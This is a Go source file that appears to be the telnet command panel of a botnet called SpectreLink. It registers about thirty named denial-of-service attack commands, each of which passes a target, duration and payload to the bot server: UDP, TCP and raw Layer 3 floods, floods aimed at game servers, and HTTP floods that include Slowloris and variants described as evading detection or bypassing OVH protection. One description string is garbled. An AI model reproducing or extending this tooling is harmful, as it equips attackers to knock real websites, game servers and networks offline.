package user

import (
	"SpectreLink/bot"
)

type layer4Attack struct {
	server     *bot.Server
	s          *TelnetSession
	methodName string
	Target     string `short:"t" long:"target" description:"Target IP"`
	TargetPort string `short:"p" long:"target-port" description:"Target port"`
	Duration   string `short:"d" long:"duration" description:"Duration in seconds or like 5s, 10h"`
	Payload    string `short:"p" long:"payload" description:"Payload"`
}

type layer7Attack struct {
	server     *bot.Server
	s          *TelnetSession
	methodName string
	Target     string `short:"t" long:"target" description:"Target URL"`
	Duration   string `short:"d" long:"duration" description:"Duration in seconds or like 5s, 10h"`
	Data       string `short:"d" long:"data" description:"Data"`
	Header     string `short:"h" long:"header" description:"Header"`
	RPC        string `short:"r" long:"rpc" description:"RPC"`
	Version    string `short:"v" long:"version" description:"HTTP Version"`
}

type layer3Attack struct {
	server     *bot.Server
	s          *TelnetSession
	methodName string
	Target     string `short:"t" long:"target" description:"Target IP"`
	Duration   string `short:"d" long:"duration" description:"Duration in seconds or like 5s, 10h"`
	Payload    string `short:"p" long:"payload" description:"Payload"`
}

func (a *layer3Attack) Execute(args []string) error {
	return a.server.HandleAttack(a.methodName, map[string]string{
		"target":   a.Target,
		"duration": a.Duration,
		"payload":  a.Payload,
	})
}

func (a *layer4Attack) Execute(args []string) error {
	return a.server.HandleAttack(a.methodName, map[string]string{
		"target":      a.Target,
		"target-port": a.TargetPort,
		"duration":    a.Duration,
		"payload":     a.Payload,
	})
}

func (a *layer7Attack) Execute(args []string) error {
	return a.server.HandleAttack(a.methodName, map[string]string{
		"target":   a.Target,
		"duration": a.Duration,
		"data":     a.Data,
		"header":   a.Header,
		"rpc":      a.RPC,
		"version":  a.Version,
	})
}

func (s *TelnetSession) RegisterMethods(server *bot.Server) {
	const PREFIX = "!"
	// UDP (Layer 4)
	_, _ = s.manager.AddCommand(PREFIX+"udp-pps", "Optimized for maximum PPS", "Performance optimized for maximum packets per second (PPS)", &layer4Attack{server, s, "udp-pps", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-storm", "Optimized for undetectable flooding", "Performance optimized for undetectable flooding", &layer4Attack{server, s, "udp-storm", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-power", "Optimized for high bandwidth", "Performance optimized for high bandwidth", &layer4Attack{server, s, "udp-power", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-ovh", "Optimized for bypassing OVH protection", "Performance optimized for bypassing OVH protection", &layer4Attack{server, s, "udp-ovh", "", "", "", ""})

	// TCP (Layer 4)
	_, _ = s.manager.AddCommand(PREFIX+"tcp-syn", "Sends TCP SYN packets", "Sends TCP raw packets with the SYN flag", &layer4Attack{server, s, "tcp-syn", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-ack", "Sends TCP ACK packets", "Sends TCP raw packets with the ACK flag", &layer4Attack{server, s, "tcp-ack", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-mass", "Sends TCP XMAS packets", "Sends TCP raw packets with all flags set (XMAS)", &layer4Attack{server, s, "tcp-mass", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-rf", "Sends TCP with random flags", "Sends TCP raw packets with random flags and data", &layer4Attack{server, s, "tcp-rf", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-socket", "Creates high connection spam", "Creates normal TCP connections with high connection spam", &layer4Attack{server, s, "tcp-socket", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-halt", "Creates TCP but interrupts after connection", "Creates normal TCP connections but interrupts after connection", &layer4Attack{server, s, "tcp-halt", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-drop", "Sends TCP RST or FIN", "Sends TCP raw packets with random choices of RST or FIN flags", &layer4Attack{server, s, "tcp-drop", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"tcp-tfo", "Sends SYN+ACK packets", "Sends TCP raw packets with the SYN+ACK flags", &layer4Attack{server, s, "tcp-tfo", "", "", "", ""})

	// Layer 3
	_, _ = s.manager.AddCommand(PREFIX+"esp", "Sends raw ESP packets", "Sends raw packets with ESP (Encapsulating Security Payload) headers", &layer3Attack{server, s, "esp", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"gre", "Sends raw GRE packets", "Sends raw packets with GRE (Generic Routing Encapsulation) headers", &layer3Attack{server, s, "gre", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"igmp", "Sends raw IGMP packets", "Sends raw packets with IGMP (Internet Group Management Protocol) headers", &layer3Attack{server, s, "igmp", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"icmp", "Sends raw ICMP packets", "Sends raw packets with ICMP (Internet Control Message Protocol) headers", &layer3Attack{server, s, "icmp", "", "", ""})

	// Game
	_, _ = s.manager.AddCommand(PREFIX+"tcp-mc", "Minecraft Status Ping payload", "Creates a TCP connection with a Minecraft Status Ping payload", &layer4Attack{server, s, "tcp-mc", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-fivem", "FiveM Status Ping payload", "Sends UDP packets with a FiveM status ping payload", &layer4Attack{server, s, "udp-fivem", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-ts3", "TeamSpeak 3 Handshake payload", "Sends UDP packets with a TeamSpeak 3 handshake payload", &layer4Attack{server, s, "udp-ts3", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-vse", "Valve Source Engine query payload", "Sends UDP packets with a Valve Source Engine query payload", &layer4Attack{server, s, "udp-vse", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-raknet", "RakNet payload", "Sends UDP packets with a RakNet payload", &layer4Attack{server, s, "udp-raknet", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"udp-samp", "SAMP payload", "Sends UDP packets with a SAMP (San Andreas Multiplayer) payload", &layer4Attack{server, s, "udp-samp", "", "", "", ""})

	// HTTP (Layer 7)
	_, _ = s.manager.AddCommand(PREFIX+"http-flood", "HTTP request flood", "Raw HTTP request flood optimized for performance and PPS", &layer7Attack{server, s, "http-flood", "", "", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"http-bypass", "HTTP flood with evasion", "HTTP flood optimized for evading detection", &layer7Attack{server, s, "http-bypass", "", "", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"http-slow", "HTTP Slowloris attack", "HTTP Slowloris attack", &layer7Attack{server, s, "http-slow", "", "", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"http-smart", "Smart HTTP flood", "HTTP flood designed to follow cookieserver, s,pathserver, s,and fingerprints to evade detection", &layer7Attack{server, s, "http-smart", "", "", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"http-load", "High load HTTP flood", "HTTP-BYPASS with high data load to exhaust target memory", &layer7Attack{server, s, "http-load", "", "", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"http-exploit", "Exploit HTTP flood", "HTTP flood using well-known DoS exploits to ensure target failure", &layer7Attack{server, s, "http-exploit", "", "", "", "", "", ""})
	_, _ = s.manager.AddCommand(PREFIX+"http-bot", "Bot-like HTTP flood", "Floods the target like a search engine bot, spamming requests", &layer7Attack{server, s, "http-bot", "", "", "", "", "", ""})
}
